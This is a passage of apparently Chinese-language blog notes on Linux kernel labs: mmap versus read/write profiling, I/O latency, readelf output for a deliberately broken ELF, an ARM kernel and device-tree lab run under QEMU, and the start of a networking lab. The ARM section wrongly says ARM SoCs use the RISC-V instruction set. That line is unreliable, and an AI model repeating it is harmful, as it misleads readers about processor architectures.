blk_size, size - to_write);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		to_write -= blk_size;</span><br><span class="line">		dst_p += blk_size;</span><br><span class="line">		src_p += blk_size;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">memcpy</span>(dst_p, src_p, to_write);</span><br><span class="line">		msync(dst_p - size, size, MS_SYNC);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		pread(src_fd, buf, to_write, to_write);</span><br><span class="line">		pwrite(dst_fd, buf, blk_size, to_write);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	close(src_fd);</span><br><span class="line">	close(dst_fd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_profiling/<span class="number">3</span>-memory# ./memory <span class="number">1</span> <span class="number">10240000</span> <span class="number">1</span> <span class="number">2</span>         </span><br><span class="line">mode <span class="number">1</span> blk_size <span class="number">10240000</span> src <span class="number">1</span> dst <span class="number">2</span>                                            </span><br><span class="line">root@qemux86:~/skels/kernel_profiling/<span class="number">3</span>-memory# ./memory <span class="number">0</span> <span class="number">10240000</span> <span class="number">1</span> <span class="number">2</span>         </span><br><span class="line">mode <span class="number">0</span> blk_size <span class="number">10240000</span> src <span class="number">1</span> dst <span class="number">2</span>  </span><br></pre></td></tr></table></figure>
<ul>
<li>使用 read/write 有明显的延迟，使用 I/O，速度较慢</li>
<li>使用 mmap 几乎可以瞬间完成，使用映射，速度较快</li>
</ul>
<p><strong>I/O Latency</strong></p>
<p>我们编写了一个读取磁盘内容的模块，插入 bio.ko 模块，我们看到系统负载出现较大峰值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Mem: <span class="number">180032</span>K used, <span class="number">58880</span>K <span class="built_in">free</span>, <span class="number">156</span>K shrd, <span class="number">324</span>K buff, <span class="number">15248</span>K cached</span><br><span class="line">CPU:   <span class="number">0</span>% usr  <span class="number">46</span>% sys   <span class="number">0</span>% nic  <span class="number">51</span>% idle   <span class="number">0</span>% io   <span class="number">0</span>% irq   <span class="number">1</span>% sirq</span><br><span class="line">Load average: <span class="number">17.43</span> <span class="number">5.01</span> <span class="number">1.75</span> <span class="number">1</span>/<span class="number">77</span> <span class="number">371</span></span><br><span class="line">  PID  PPID USER     STAT   VSZ %VSZ %CPU COMMAND</span><br><span class="line">   <span class="number">34</span>     <span class="number">2</span> root     IW&lt;      <span class="number">0</span>   <span class="number">0</span>%  <span class="number">24</span>% [kworker/<span class="number">0</span>:<span class="number">1</span>H-kb]</span><br><span class="line">    <span class="number">9</span>     <span class="number">2</span> root     SW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">4</span>% [ksoftirqd/<span class="number">0</span>]</span><br><span class="line">   <span class="number">10</span>     <span class="number">2</span> root     IW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">2</span>% [rcu_sched]</span><br><span class="line">  <span class="number">371</span>   <span class="number">208</span> root     R     <span class="number">2972</span>   <span class="number">1</span>%   <span class="number">1</span>% top</span><br><span class="line">  <span class="number">361</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd10]</span><br><span class="line">  <span class="number">364</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd13]</span><br><span class="line">  <span class="number">365</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd14]</span><br><span class="line">  <span class="number">366</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd15]</span><br><span class="line">  <span class="number">367</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd16]</span><br><span class="line">  <span class="number">368</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd17]</span><br><span class="line">  <span class="number">369</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd18]</span><br><span class="line">  <span class="number">370</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd19]</span><br><span class="line">  <span class="number">353</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd2]</span><br><span class="line">  <span class="number">354</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd3]</span><br><span class="line">  <span class="number">355</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd4]</span><br><span class="line">  <span class="number">356</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd5]</span><br><span class="line">  <span class="number">357</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd6]</span><br><span class="line">  <span class="number">358</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd7]</span><br><span class="line">  <span class="number">359</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd8]</span><br><span class="line">  <span class="number">360</span>     <span class="number">2</span> root     DW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">1</span>% [mykwriterd9]</span><br></pre></td></tr></table></figure>
<p><strong>Bad ELF</strong></p>
<p>我们设法构建了一个ELF文件（作为 Unikraft 构建的一部分），该文件在进行静态分析时是有效的，但无法执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="number">5</span>-bad-elf git:(master) ✗ ./bad_elf </span><br><span class="line">[<span class="number">1</span>]    <span class="number">7357</span> segmentation fault  ./bad_elf</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="number">5</span>-bad-elf git:(master) ✗ readelf -a bad_elf</span><br><span class="line">ELF 头：</span><br><span class="line">  Magic：   <span class="number">7f</span> <span class="number">45</span> <span class="number">4</span>c <span class="number">46</span> <span class="number">02</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  类别:                              ELF64</span><br><span class="line">  数据:                              <span class="number">2</span> 补码，小端序 (little endian)</span><br><span class="line">  Version:                           <span class="number">1</span> (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI 版本:                          <span class="number">0</span></span><br><span class="line">  类型:                              EXEC (可执行文件)</span><br><span class="line">  系统架构:                          Advanced Micro Devices X86<span class="number">-64</span></span><br><span class="line">  版本:                              <span class="number">0x1</span></span><br><span class="line">  入口点地址：               <span class="number">0x400130</span></span><br><span class="line">  程序头起点：          <span class="number">64</span> (bytes into file)</span><br><span class="line">  Start of section headers:          <span class="number">60352</span> (bytes into file)</span><br><span class="line">  标志：             <span class="number">0x0</span></span><br><span class="line">  Size of <span class="keyword">this</span> header:               <span class="number">64</span> (bytes)</span><br><span class="line">  Size of program headers:           <span class="number">56</span> (bytes)</span><br><span class="line">  Number of program headers:         <span class="number">3</span></span><br><span class="line">  Size of section headers:           <span class="number">64</span> (bytes)</span><br><span class="line">  Number of section headers:         <span class="number">10</span></span><br><span class="line">  Section header <span class="built_in">string</span> table index: <span class="number">9</span></span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [号] 名称              类型             地址              偏移量</span><br><span class="line">       大小              全体大小          旗标   链接   信息   对齐</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS         <span class="number">00000000004000f</span>0  <span class="number">000000f</span>0</span><br><span class="line">       <span class="number">000000000000b</span>e11  <span class="number">0000000000000000</span> WAX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [ <span class="number">2</span>] .uk_thread_initta NOBITS           <span class="number">000000000040b</span>f01  <span class="number">0000b</span>f01</span><br><span class="line">       <span class="number">0000000000000007</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">3</span>] .uk_inittab       PROGBITS         <span class="number">000000000040</span>c000  <span class="number">0000b</span>f20</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">4</span>] .rodata           PROGBITS         <span class="number">000000000040</span>c020  <span class="number">0000b</span>f40</span><br><span class="line">       <span class="number">0000000000002b</span>85  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">32</span></span><br><span class="line">  [ <span class="number">5</span>] .tbss             NOBITS           <span class="number">000000000040</span>eba8  <span class="number">0000</span>eac5</span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span> WAT       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .data             PROGBITS         <span class="number">000000000040</span>ebb0  <span class="number">0000</span>ead0</span><br><span class="line">       <span class="number">0000000000000070</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [ <span class="number">7</span>] .bss              NOBITS           <span class="number">000000000040</span>ec20  <span class="number">0000</span>eb40</span><br><span class="line">       <span class="number">00000000000003e8</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">32</span></span><br><span class="line">  [ <span class="number">8</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">0000</span>eb40</span><br><span class="line">       <span class="number">0000000000000029</span>  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">9</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">0000</span>eb69</span><br><span class="line">       <span class="number">0000000000000052</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br><span class="line"></span><br><span class="line">There are no section groups in <span class="keyword">this</span> file.</span><br><span class="line"></span><br><span class="line">程序头：</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  LOAD           <span class="number">0x00000000000000f0</span> <span class="number">0x00000000004000f0</span> <span class="number">0x00000000004000f0</span></span><br><span class="line">                 <span class="number">0x000000000000be11</span> <span class="number">0x000000000000be18</span>  RWE    <span class="number">0x10</span></span><br><span class="line">  LOAD           <span class="number">0x000000000000bf20</span> <span class="number">0x000000000040c000</span> <span class="number">0x000000000040c000</span></span><br><span class="line">                 <span class="number">0x0000000000002c20</span> <span class="number">0x0000000000003008</span>  RW     <span class="number">0x20</span></span><br><span class="line">  GNU_STACK      <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line">                 <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span>  RWE    <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  段节...</span><br><span class="line">   <span class="number">00</span>     .text .uk_thread_inittab </span><br><span class="line">   <span class="number">01</span>     .uk_inittab .rodata .data .bss </span><br><span class="line">   <span class="number">02</span>     </span><br><span class="line"></span><br><span class="line">There is no dynamic section in <span class="keyword">this</span> file.</span><br><span class="line"></span><br><span class="line">该文件中没有重定位信息。</span><br><span class="line"></span><br><span class="line">The decoding of unwind sections <span class="keyword">for</span> machine type Advanced Micro Devices X86<span class="number">-64</span> is <span class="keyword">not</span> currently supported.</span><br><span class="line"></span><br><span class="line">No version information found in <span class="keyword">this</span> file.</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/23/Linux-Lab9-Kernel%20Development%20on%20ARM/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/23/Linux-Lab9-Kernel%20Development%20on%20ARM/" class="post-title-link" itemprop="url">Linux-Lab9-Kernel Development on ARM</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-23 14:19:41 / Modified: 14:21:02" itemprop="dateCreated datePublished" datetime="2022-10-23T14:19:41+08:00">2022-10-23</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Kernel Development on ARM</strong></p>
<p>实验目标：</p>
<ul>
<li>了解片上系统 System on a Chip（SoC）的含义</li>
<li>熟悉使用 ARM 作为受支持架构的嵌入式世界</li>
<li>了解主板支持包的含义（BSP）</li>
<li>以 i.MX6UL 平台为例，使用 Qemu 编译和引导 ARM 内核</li>
<li>使用设备树熟悉硬件描述</li>
</ul>
<p>片上系统 System on a Chip 是将整个系统集成到其上的集成电路（IC）</p>
<p>通常在 SoC 上可以找到的组件包括中央处理单元（CPU）、内存、输入/输出端口、存储设备以及更复杂的模块，如音频数字接口、神经处理单元（NPU）或图形处理单元（GPU）</p>
<p>SoC 可用于各种最常见的应用，包括：</p>
<ul>
<li>消费类电子产品（电视机、手机、视频游戏机）</li>
<li>工业计算机（医学成像等）</li>
<li>汽车</li>
<li>家电</li>
</ul>
<p>对于 SoCs，最好使用 ARM 架构，使用的标准指令集架构是 RISC-V（精简指令集计算机，Reduced Instruction Set Computer-RISC）</p>
<p>ARM 平台的简化视图如下图所示：</p>
<img src="/2022/10/23/Linux-Lab9-Kernel%20Development%20on%20ARM/1666408197853.png" class width="1666408197853"> 
<ul>
<li>一或者多个 CPU</li>
<li>一个系统总线</li>
<li>时钟和复位模块（PLL，OSC，复位控制器）</li>
<li>中断控制器</li>
<li>定时器</li>
<li>内存控制器</li>
<li>外设控制器</li>
</ul>
<p>以下是 i.MX6UL 平台的完整框图：</p>
<img src="/2022/10/23/Linux-Lab9-Kernel%20Development%20on%20ARM/1666504277105.png" class width="1666504277105"> 
<p><strong>Board Support package</strong></p>
<p>Board Support Package（BSP）是允许演示特定硬件平台功能的最小软件包集：</p>
<ul>
<li>工具链 Toolchain：为ARM平台生成可执行代码的交叉编译器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf # for arm32</span><br><span class="line">sudo apt-get install gcc-aarch64-linux-gnu g++-aarch64-linux-gnu     # for arm64</span><br></pre></td></tr></table></figure>
<ul>
<li>BootLoader 引导加载程序</li>
<li>Linux 内核映像、设备树文件和驱动程序</li>
<li>Rootfs 根文件系统 </li>
</ul>
<p><strong>Device tree</strong></p>
<p>设备树 DT 是用于描述系统中硬件设备的树结构，树中的每个节点描述一个设备，因此称为设备节点，引入 DT 是为了提供一种发现 “non-discoverable 不可发现” 的硬件的方法</p>
<p>设备树存储在设备树源（.dts）中，并编译为设备树 blob（.dtb）</p>
<ul>
<li>一个节点可能包含以该格式排列的多个属性，名称是一个字符串，值可以是字节，字符串，字符串数组</li>
<li>下面是一个示例：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/ &#123;</span><br><span class="line">     node@<span class="number">0</span> &#123;</span><br><span class="line">          empty-property;</span><br><span class="line">          <span class="built_in">string</span>-property = <span class="string">&quot;string value&quot;</span>;</span><br><span class="line">          <span class="built_in">string</span>-<span class="built_in">list</span>-property = <span class="string">&quot;string value 1&quot;</span>, <span class="string">&quot;string value 2&quot;</span>;</span><br><span class="line">          <span class="keyword">int</span>-<span class="built_in">list</span>-property = &lt;value1 value2&gt;;</span><br><span class="line"></span><br><span class="line">          child-node@<span class="number">0</span> &#123;</span><br><span class="line">                  child-empty-property;</span><br><span class="line">                  child-<span class="built_in">string</span>-property = <span class="string">&quot;string value&quot;</span>;</span><br><span class="line">                  child-node-reference = &lt;&amp;child-node1&gt;;</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">          child-node1: child-node@<span class="number">1</span> &#123;</span><br><span class="line">                  child-empty-property;</span><br><span class="line">                  child-<span class="built_in">string</span>-property = <span class="string">&quot;string value&quot;</span>;</span><br><span class="line">          &#125;;</span><br><span class="line">   &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>Rootfs</strong></p>
<p>根文件系统是挂载在文件层次结构顶部的文件系统，它至少应包含允许系统引导到 shell 的关键文件</p>
<ul>
<li>我们将使用 Yocto 根图像，为了下载一个 rootfs 映像，需要运行：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> tools/labs/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ARCH=arm make core-image-minimal-qemuarm.ext4</span></span><br></pre></td></tr></table></figure>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板准备 skeletons  </li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=arm_kernel_development make skels</span><br><span class="line">make build</span><br></pre></td></tr></table></figure>
<p>ARM 内核编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- make menuconfig</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> FSL_ASRC=n and DRM_MXSFB=n</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- make -j8</span></span><br></pre></td></tr></table></figure>
<p>内核模块编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> modules build</span></span><br><span class="line">tools/labs $ ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- make build</span><br><span class="line"><span class="meta">#</span><span class="bash"> modules copy</span></span><br><span class="line">tools/labs $ ARCH=arm make copy</span><br><span class="line"><span class="meta">#</span><span class="bash"> kernel build</span></span><br><span class="line">tools/labs $ ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- make -j8</span><br></pre></td></tr></table></figure>
<p>ARM 内核启动：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm -M mcimx6ul-evk -cpu cortex-a7 -m 512M -kernel arch/arm/boot/zImage -nographic  -dtb arch/arm/boot/dts/imx6ul-14x14-evk.dtb -append &quot;root=/dev/mmcblk0 rw console=ttymxc0 loglevel=8 earlycon printk&quot; -sd tools/labs/core-image-minimal-qemux86.ext4 </span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/21/Linux-Lab8-Networking/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/21/Linux-Lab8-Networking/" class="post-title-link" itemprop="url">Linux-Lab8-Networking</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-21 20:44:35 / Modified: 20:45:28" itemprop="dateCreated datePublished" datetime="2022-10-21T20:44:35+08:00">2022-10-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>22k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>20 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Networking</strong></p>
<p>实验目标：</p>
<ul>
<li>了解 Linux 内核网络体系结构</li>
<li>使用数据包过滤器或防火墙，学习 IP 数据包管理技能</li>
<li>熟悉如何在 Linux 内核级别使用套接字</li>
</ul>
<p>互联网的发展导致网络应用的指数级增长，从而增加了操作系统网络子系统的速度和生产力要求</p>
<ul>
<li>网络子系统不是操作系统内核的基本组件（Linux 内核可以在没有网络支持的情况下编译）</li>
<li>然而，计算系统（甚至是嵌入式设备）不太可能具有非网络操作系统</li>
<li>现代操作系统使用 TCP/IP 堆栈，由内核实现传输层的协议，而应用层协议通常在用户空间（HTTP，FTP，SSH等）中实现</li>
</ul>
<p><strong>Networking in user space</strong></p>
<p>在用户空间中，网络通信的抽象是套接字 socket</p>
<p>套接字 socket 抽象了一个通信通道，是基于内核的 TCP/IP 堆栈交互接口（其实 TCP/IP 的底层就是发包，通过发包实现计算机网络之间的交互，而 socket 让发包变得更简单了）</p>
<p><strong>Networking in Linux kernel</strong></p>
<p>Linux 内核为处理网络数据包提供了三种基本结构：</p>
<p><code>struct socket</code>：</p>
<ul>
<li>一个非常接近用户空间的抽象，即用于编程网络应用的 BSD 套接字</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span></span><br><span class="line">	socket_state		state; <span class="comment">/* 表示socket所处的状态 */</span></span><br><span class="line">	<span class="keyword">short</span>			type; <span class="comment">/* 该socket的类型 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags; <span class="comment">/* 标志位 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket_wq</span>	*<span class="title">wq</span>;</span> <span class="comment">/* 等待该socket的进程队列和异步通知队列 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span>		*<span class="title">file</span>;</span> <span class="comment">/* 与之关联的file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span>		*<span class="title">sk</span>;</span> <span class="comment">/* 与之关联的sock */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span>	*<span class="title">ops</span>;</span> <span class="comment">/* 协议相关的一组操作集 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>相关联的 API 如下：</li>
</ul>
